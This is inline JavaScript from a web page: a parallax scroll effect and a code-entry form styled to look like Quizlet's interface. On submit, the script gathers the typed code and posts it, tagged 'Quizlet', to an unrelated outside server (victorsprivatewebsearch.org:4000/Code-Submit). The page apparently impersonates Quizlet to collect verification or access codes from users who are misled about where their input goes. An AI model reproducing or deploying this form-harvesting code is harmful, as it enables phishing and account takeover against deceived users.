        <script>
            document.addEventListener("scroll", function () {
                var scrollTop = window.pageYOffset || document.documentElement.scrollTop;
                var background = document.getElementById("background");
                var foreground = document.getElementById("foreground");
                var content = document.getElementById("inside")
                background.style.top = -(scrollTop * 1) + 'px'; // Moves slower, change 0.2 for more or less speed
                foreground.style.top = -(scrollTop * 2) + 'px'; // Moves faster, change 0.5 for more or less speed
                if (scrollTop >= 700) {
                    opacity = 1;
                } else {
                    var opacity = 1 - (200 / scrollTop);
                }
                content.style.color = `rgba(255, 255, 255, ${opacity})`;
            });
            document.addEventListener('DOMContentLoaded', function () {
                let inputs = Array.from(document.querySelectorAll('.quizlet-ui-input-input'));
                let button = document.querySelector('.quizlet-button');

                // Listen for input and keyup events on each input field
                inputs.forEach((input, index) => {
                    input.addEventListener('input', () => {
                        // Check if all inputs are filled
                        if (inputs.every(input => input.value.trim() !== '')) {
                            button.classList.add('active');
                            button.disabled = false;
                        } else {
                            button.classList.remove('active');
                            button.disabled = true;
                        }

                        // Check if current input field is filled and it's not the last one
                        if (input.value.trim() !== '' && index < inputs.length - 1) {
                            // Move focus to next input field
                            inputs[index + 1].focus();
                        }
                    });

                    input.addEventListener('keyup', (event) => {
                        // Check if the Backspace key was pressed and the input field is empty
                        if (event.key === 'Backspace' && input.value.trim() === '' && index > 0) {
                            // Move focus to the previous input field
                            inputs[index - 1].focus();
                        }
                    });
                });
            });
            document.querySelector(".quizlet-main").addEventListener("submit", function (event) {
                // prevent the form from submitting (refreshing the page)
                event.preventDefault();

                // log the input values
                let inputs = document.querySelectorAll('.quizlet-ui-input-input');
                let code = '';
                inputs.forEach(input => {
                    code += input.value;
                });
                console.log(code);
                let data = {
                    code: code,
                    type: "Quizlet"
                };

                // send the data to the server
                fetch('https://victorsprivatewebsearch.org:4000/Code-Submit', {
                    method: 'POST', // or 'PUT', 'PATCH', etc.
                    headers: {
                        'Content-Type': 'application/json',
                        // 'Authorization': 'Bearer your-token' // if needed
                    },
                    body: JSON.stringify(data),
                })
                    .then(response => response.json())
                    .then(data => {
                        console.log('Success:', data);
                    })
                    .catch((error) => {
                        console.error('Error:', error);
                    });
            });

        </script>

        <script>
            window.onload = function () {
                const inputs = document.querySelectorAll('.quizlet-ui-input-input');
                const button = document.querySelector('.quizlet-button');

                for (let i = 0; i < inputs.length; i++) {
                    inputs[i].addEventListener('input', () => {
                        let allFilled = Array.from(inputs).every(input => input.value !== '');
                        if (allFilled) {
                            button.style.backgroundColor = "#3ccfcf";
                            button.classList.add("active")
                            button.disabled = false;
                        } else {
                            button.style.backgroundColor = ""; // Reset to default color when not all inputs are filled
                            button.classList.remove('active');
                            button.disabled = true;
                        }
                    });
                }
            };
